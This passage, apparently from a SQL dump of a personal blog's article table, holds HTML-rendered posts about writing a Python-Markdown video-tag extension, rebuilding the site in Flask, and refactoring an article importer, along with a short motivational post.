<span class="hll">            <span class="k">if</span> <span class="n">m</span><span class="p">:</span>
</span>                <span class="c1"># you got a match, do what you ned to</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">new_lines</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>  <span class="c1"># pass through unmolested</span>
        <span class="k">return</span> <span class="n">new_lines</span>  <span class="c1"># sends back the completed source</span>
</pre></div>


<p>Now it is a straightforward matter of breaking out the groups from the regex and building the <code>&lt;video&gt;</code> element.</p>
<div class="codehilite"><pre><span></span><span class="k">class</span> <span class="nc">GifVPreprocessor</span><span class="p">(</span><span class="n">Preprocessor</span><span class="p">):</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">gifv</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">gifv</span> <span class="o">=</span> <span class="n">gifv</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">RE</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&lt;gifv ([\w0-9_-]+) ([\w0-9_-]+[,?[\w0-9_-]+]?) ?/&gt;$&#39;</span><span class="p">)</span>
        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">lines</span><span class="p">):</span>
        <span class="n">new_lines</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
            <span class="n">m</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">RE</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">m</span><span class="p">:</span>
                <span class="n">filename</span> <span class="o">=</span> <span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
                <span class="n">extensions</span> <span class="o">=</span> <span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)</span>
                <span class="n">video</span> <span class="o">=</span> <span class="n">etree</span><span class="o">.</span><span class="n">Element</span><span class="p">(</span><span class="s1">&#39;video&#39;</span><span class="p">)</span>
                <span class="n">video</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s2">&quot;autoplay&quot;</span><span class="p">,</span> <span class="s2">&quot;true&quot;</span><span class="p">)</span>
                <span class="n">video</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s2">&quot;controls&quot;</span><span class="p">,</span> <span class="s2">&quot;false&quot;</span><span class="p">)</span>
                <span class="n">video</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s2">&quot;loop&quot;</span><span class="p">,</span> <span class="s2">&quot;true&quot;</span><span class="p">)</span>
                <span class="n">video</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s2">&quot;class&quot;</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">gifv</span><span class="o">.</span><span class="n">getConfig</span><span class="p">(</span><span class="s1">&#39;css_class&#39;</span><span class="p">))</span>

                <span class="k">for</span> <span class="n">extension</span> <span class="ow">in</span> <span class="n">extensions</span><span class="p">:</span>
                    <span class="n">source</span> <span class="o">=</span> <span class="n">etree</span><span class="o">.</span><span class="n">SubElement</span><span class="p">(</span><span class="n">video</span><span class="p">,</span> <span class="s2">&quot;source&quot;</span><span class="p">)</span>
                    <span class="n">source</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s1">&#39;src&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">{}{}</span><span class="s1">.</span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">gifv</span><span class="o">.</span><span class="n">getConfig</span><span class="p">(</span><span class="s1">&#39;video_url_base&#39;</span><span class="p">),</span> <span class="n">filename</span><span class="p">,</span> <span class="n">extension</span><span class="p">))</span>

                <span class="n">new_lines</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">etree</span><span class="o">.</span><span class="n">tostring</span><span class="p">(</span><span class="n">video</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&quot;unicode&quot;</span><span class="p">))</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">new_lines</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>  <span class="c1"># pass through unmolested</span>
        <span class="k">return</span> <span class="n">new_lines</span>  <span class="c1"># sends back the completed source</span>
</pre></div>


<p>Why are we building this as an <code>ElementTree</code> and not raw strings? Well you can but raw strings are still a pain to deal with.</p>
<p>Why the <code>encoding="unicode"</code>? The etree will attempt to stringify but run into an error where strings are represented as bytes but are expecting strings because of the different ways Python 2 and 3 represent strings.</p>
<p>So you are done. Run the tests and see that it process the tag into what you need.</p>
<p><a href="https://assets.themetacity.com/code/theMetaCityMarkdown">You can see the full source here</a> and <a href="https://assets.themetacity.com/code/theMetaCityMarkdown.tar.gz">download a gzipped version here</a>.</p>','2017-08-26 23:01:25','2017-08-26 23:01:25','<p>Fifth and final part of making a Python Markdown extension</p>',12),
	 (17,'Writers write','writers-write','blog','<p>Writers write, photographers photograph, programmers program and runners run.</p>
<p>Just do. All the tools don''t matter if you don''t do the actual work of writing, running and programming. Excuses are grounded in reality (I do have a ten-week-old son) to look after but there is room to beat out your own brain telling you to do the lazy thing. To take the easy route.</p>
<p>That that is not what we are here to do.</p>
<p>Writers write, photographers photograph, programmers program and runners run.</p>','2018-12-08 07:53:43.869857','2018-12-08 07:53:43.869857','<p>If you are going to do it, do it.</p>',NULL),
	 (18,'Time to rebuild the MetaCity','time-to-rebuild-the-metacity','blog','<h2 id="tldr-too-annoying-to-maintain-modern-frameworks-add-value">TLDR: too annoying to maintain; modern frameworks add value</h2>
<p>The MetaCity was originally started in early 2004 as part of a uni assignment. Initial used for learning and playing around to learn Java and database nonsense it evolved over the years to become a fairly basic blogging platform.</p>
<p>It is built using Java with JavaBeans and the JSTL on top of PostgreSQL and Tomcat reverse-proxied behind apache2.</p>
<p>Over the last fifteen years or so of building upon and maintaining the system, it has become increasingly harder to maintain the environment around developing, testing, deploying and serving. This is partly due to expanded scope of other projects taking up time and just getting sick of the time devoted to operations.</p>
<p>To that end, the plan is to rebuild the MetaCity in Python with Flask to bring it into line with the MetaCity Media. This unifies development to one language and one platform, reducing cognitive overhead.</p>
<p>An added benefit is that this will finally bring the MetaCity into the world of actual frameworks with all the benefits they bring. Notably, this includes an ORM for the first time, up to date language version, and an easier to access and manage third-party package management (pip).</p>
<p>I''m also going to rework how the workshop is build and managed so that it links in a bit nicer and makes showing it in other sections much easier too.</p>
<p>Processing articles remains the same but inserting and updating might (or might not, dunno yet) change as integrating would in theory be easier.</p>
<h2 id="why">Why?</h2>
<h3 id="play">Play</h3>
<p>This is the main reason. It is an opportunity to just see what I learn and experience with a different setup and development process. Python is interesting to work with, and I hope to have fun while also building something useful doing this.</p>
<h3 id="server-maintenance">Server maintenance</h3>
<p>Reverse proxing behind tomcat for one project has become too annoying. This adds another service that needs to be updated, configured and monitored. It also means that Java needs to be updated and maintained.</p>
<h3 id="the-metacity-is-custom-code-all-they-way-down">The MetaCity is custom code all they way down</h3>
<p>That was nice at the time, but the warts are showing. Here is what a rebuild hopes to solve:</p>
<h4 id="no-orm">No ORM</h4>
<p>This one is simply a time saver. Currently, the ORM is a significant portion of the LOC and this boilerplate is a pain to maintain. While straightforward to do the mappings, it is the migrations and updates to the objects in templates that get dumb.</p>
<h4 id="template-abstraction-is-messy">Template abstraction is messy</h4>
<p>Files are manually included and messily combined to make the pages show correctly. The includes and override mechanic of Flask is much nicer to use.</p>
<h4 id="pluginthird-party-code-is-easier">Plugin/third party code is easier</h4>
<p>The MetaCity''s plugins are all manually updated (via searching) and inserted into the appropriate directory manually. Flask uses pip and is much easier to maintain. Have not run into an issue with a feature being supported in Java and not in Python but the MetaCity is not doing anything too crazy.</p>
<h2 id="what-would-be-changednew">What would be changed/new?</h2>
<p>Not too much really. This is basically a one for one feature wise rebuild. The main difference is (planned at least) to combine the tagging system to integrate the blog and workshop together, making indexes and notification of updates easier (as well as the document import). There are some schema changes to make this happen but for the most part there should be no data loss and only transparent changes to the front end.</p>
<h2 id="other">Other</h2>
<p>This presents an interesting opportunity to do a comparison of speeds etc which might be interesting.</p>
<p>It will also be nice to time-lapse the whole thing to see what kind of dev time this takes.</p>','2018-12-15 15:21:03','2018-12-08 15:21:03.890126','<p>the MetaCity backend is getting rebuilt. Here are some of the details.</p>',NULL),
	 (20,'Not reading the fucking manual leads to pain. Again.','not-reading-the-fucking-manual-leads-to-pain-again.','blog','<p>The articles for this site are written in Markdown and then parsed and inserted by Python.</p>
<p>I was manually parsing then constructing the articles from an in-house format that was a bit flaky. The format looked something like this:</p>
<div class="codehilite"><pre><span></span><span class="gh"># Title of the article</span>

The blurb/summary shown on the index pages.

###################
Type: blog/workshop
Tags: Comma,delimited,list
Parent: id of series parent
###################

Article proper starts
</pre></div>


<p>Problems arose immediately: does the first title line have a space or not? Is there always a blank line following that? Having to manually isolate the meta fields within the <code>####################</code> fenced blocks is dumb. Is there another blank line after that? Having to remember that this is the format and parse the file several times to make sure I have done it correctly.</p>
<p>Nonsense. Just nonsense.</p>
<p>Imagine my surprise then, that when I was reading the documentation of the extensions'' library that someone else had run into this issue, written it as an extension and published it as part of the main library. Who would have thought? Apparently not me.</p>
<p>Anyway, this transforms the code in two different ways: the files change to be in a much more palatable and stable format, and the files can now be read directly from disk and don''t require manually reading them in (also in the docs).</p>
<p>Goes from this:</p>
<div class="codehilite"><pre><span></span><span class="sd">&quot;&quot;&quot; Setup etc done previously above &quot;&quot;&quot;</span>

<span class="k">class</span> <span class="nc">Article</span><span class="p">:</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">file_object</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">file_object</span> <span class="o">=</span> <span class="n">file_object</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">markdown_processor</span> <span class="o">=</span> <span class="n">Markdown</span><span class="p">()</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">meta</span> <span class="o">=</span> <span class="p">{}</span>

        <span class="k">if</span> <span class="n">file_object</span><span class="o">.</span><span class="n">id</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">meta</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">file_object</span><span class="o">.</span><span class="n">id</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">))</span>

        <span class="n">split_article</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">file_object</span><span class="o">.</span><span class="n">raw_data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;####################&#39;</span><span class="p">)</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">head</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_extract_head</span><span class="p">(</span><span class="n">split_article</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">meta</span> <span class="o">=</span> <span class="p">{</span><span class="o">**</span><span class="bp">self</span><span class="o">.</span><span class="n">meta</span><span class="p">,</span> <span class="o">**</span><span class="bp">self</span><span class="o">.</span><span class="n">_extract_meta</span><span class="p">(</span><span class="n">split_article</span><span class="p">[</span><span class="mi">1</span><span class="p">])}</span>

        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">meta</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">):</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">article</span> <span class="o">=</span> <span class="n">models</span><span class="o">.</span><span class="n">Article</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">meta</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">))</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">article</span><span class="o">.</span><span class="n">id</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">meta</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Article exists. Updating...&quot;</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">article</span> <span class="o">=</span> <span class="n">models</span><span class="o">.</span><span class="n">Article</span><span class="p">()</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;New article.&quot;</span><span class="p">)</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">article</span><span class="o">.</span><span class="n">title</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">head</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">article</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">head</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">article</span><span class="o">.</span><span class="n">blurb</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">head</span><span class="p">[</span><span class="s1">&#39;blurb&#39;</span><span class="p">]</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">article</span><span class="o">.</span><span class="n">text</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">markdown_processor</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="n">split_article</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">article</span><span class="o">.</span><span class="n">parent_id</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">meta</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;parent&#39;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">article</span><span class="o">.</span><span class="n">type</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">meta</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;type&#39;</span><span class="p">,</span> <span class="s1">&#39;blog&#39;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">article</span><span class="o">.</span><span class="n">blurb</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">head</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;blurb&#39;</span><span class="p">)</span>

        <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">article</span><span class="p">)</span>

        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Removing tags&quot;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">article</span><span class="o">.</span><span class="n">tags</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>

        <span class="k">for</span> <span class="n">tag</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">meta</span><span class="p">[</span><span class="s1">&#39;tags&#39;</span><span class="p">]:</span>
            <span class="n">t</span> <span class="o">=</span> <span class="n">models</span><span class="o">.</span><span class="n">Tag</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">tag</span><span class="o">=</span><span class="n">tag</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>

            <span class="k">if</span> <span class="n">t</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
                <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">models</span><span class="o">.</span><span class="n">Tag</span><span class="p">(</span><span class="n">tag</span><span class="o">=</span><span class="n">tag</span><span class="p">))</span>
                <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
                <span class="n">t</span> <span class="o">=</span> <span class="n">models</span><span class="o">.</span><span class="n">Tag</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">tag</span><span class="o">=</span><span class="n">tag</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>

            <span class="bp">self</span><span class="o">.</span><span class="n">article</span><span class="o">.</span><span class="n">tags</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Added tag: &quot;</span> <span class="o">+</span> <span class="n">tag</span><span class="p">)</span>

        <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Article saved.&quot;</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">_extract_head</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">raw</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">lines</span> <span class="o">=</span> <span class="n">raw</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span>

        <span class="c1"># Strips of the &#39;# &#39; (hash-space) at the start of the title</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">title</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">lines</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()[</span><span class="mi">2</span><span class="p">:]</span>

        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Title: &#39;</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">title</span><span class="p">)</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">title</span> <span class="ow">is</span> <span class="s1">&#39;&#39;</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Title is empty. Do you have blank lines at top of file?&quot;</span><span class="p">)</span>
            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">title</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s2">&quot;\.&quot;</span><span class="p">,</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s2">&quot;-+&quot;</span><span class="p">,</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">url</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;-+&#39;</span><span class="p">,</span> <span class="s1">&#39;-&#39;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">url</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;.+&#39;</span><span class="p">,</span> <span class="s1">&#39;-&#39;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">url</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;:+&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">url</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">blurb</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">markdown_processor</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">x</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">lines</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span> <span class="k">if</span> <span class="n">x</span><span class="p">))</span>

        <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;title&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">title</span><span class="p">,</span> <span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">url</span><span class="p">,</span> <span class="s1">&#39;blurb&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">blurb</span><span class="p">}</span>

    <span class="k">def</span> <span class="nf">_extract_meta</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">raw_header</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">meta</span> <span class="o">=</span> <span class="p">{}</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">lines</span> <span class="o">=</span> <span class="nb">iter</span><span class="p">(</span><span class="n">raw_header</span><span class="o">.</span><span class="n">splitlines</span><span class="p">())</span>

        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">lines</span><span class="p">:</span>
            <span class="n">s</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>

            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">meta</span><span class="p">[</span><span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">lower</span><span class="p">()]</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">meta</span><span class="p">[</span><span class="s1">&#39;tags&#39;</span><span class="p">]:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">meta</span><span class="p">[</span><span class="s1">&#39;tags&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">meta</span><span class="p">[</span><span class="s1">&#39;tags&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">meta</span><span class="p">[</span><span class="s1">&#39;tags&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">[]</span>

        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">meta</span>
</pre></div>


<p>to this:</p>
<div class="codehilite"><pre><span></span><span class="k">class</span> <span class="nc">Article</span><span class="p">:</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="n">meta</span><span class="p">):</span>

        <span class="k">if</span> <span class="n">meta</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]:</span>
            <span class="n">article</span> <span class="o">=</span> <span class="n">models</span><span class="o">.</span><span class="n">Article</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">meta</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">])</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Article exists. Updating...&quot;</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">article</span> <span class="o">=</span> <span class="n">models</span><span class="o">.</span><span class="n">Article</span><span class="p">()</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;New article.&quot;</span><span class="p">)</span>

        <span class="n">article</span><span class="o">.</span><span class="n">title</span> <span class="o">=</span> <span class="n">meta</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span>
        <span class="n">article</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">meta</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]</span>
        <span class="n">article</span><span class="o">.</span><span class="n">blurb</span> <span class="o">=</span> <span class="n">meta</span><span class="p">[</span><span class="s1">&#39;blurb&#39;</span><span class="p">]</span>
        <span class="n">article</span><span class="o">.</span><span class="n">parent_id</span> <span class="o">=</span> <span class="n">meta</span><span class="p">[</span><span class="s1">&#39;parent&#39;</span><span class="p">]</span>
        <span class="n">article</span><span class="o">.</span><span class="n">type</span> <span class="o">=</span> <span class="n">meta</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span>
        <span class="n">article</span><span class="o">.</span><span class="n">text</span> <span class="o">=</span> <span class="n">text</span>

        <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">article</span><span class="p">)</span>

        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Removing tags&quot;</span><span class="p">)</span>
        <span class="n">article</span><span class="o">.</span><span class="n">tags</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>

        <span class="k">for</span> <span class="n">tag</span> <span class="ow">in</span> <span class="n">meta</span><span class="p">[</span><span class="s1">&#39;tags&#39;</span><span class="p">]:</span>
            <span class="n">t</span> <span class="o">=</span> <span class="n">models</span><span class="o">.</span><span class="n">Tag</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">tag</span><span class="o">=</span><span class="n">tag</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>

            <span class="k">if</span> <span class="n">t</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
                <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">models</span><span class="o">.</span><span class="n">Tag</span><span class="p">(</span><span class="n">tag</span><span class="o">=</span><span class="n">tag</span><span class="p">))</span>
                <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
                <span class="n">t</span> <span class="o">=</span> <span class="n">models</span><span class="o">.</span><span class="n">Tag</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">tag</span><span class="o">=</span><span class="n">tag</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>

            <span class="n">article</span><span class="o">.</span><span class="n">tags</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Added tag: &quot;</span> <span class="o">+</span> <span class="n">tag</span><span class="p">)</span>

        <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Article saved.&quot;</span><span class="p">)</span>
</pre></div>


<p>There is a supporting file class that handles opening and extracting the content from the file. Previously it was just a file to get the raw string and pass of processing however this change now has that class do the extraction and mapping of meta (sanity chck for what is present and what is not) and then return the md object.</p>
<div class="codehilite"><pre><span></span><span class="k">class</span> <span class="nc">File</span><span class="p">:</span>
    <span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    File actions</span>
<span class="sd">    &quot;&quot;&quot;</span>

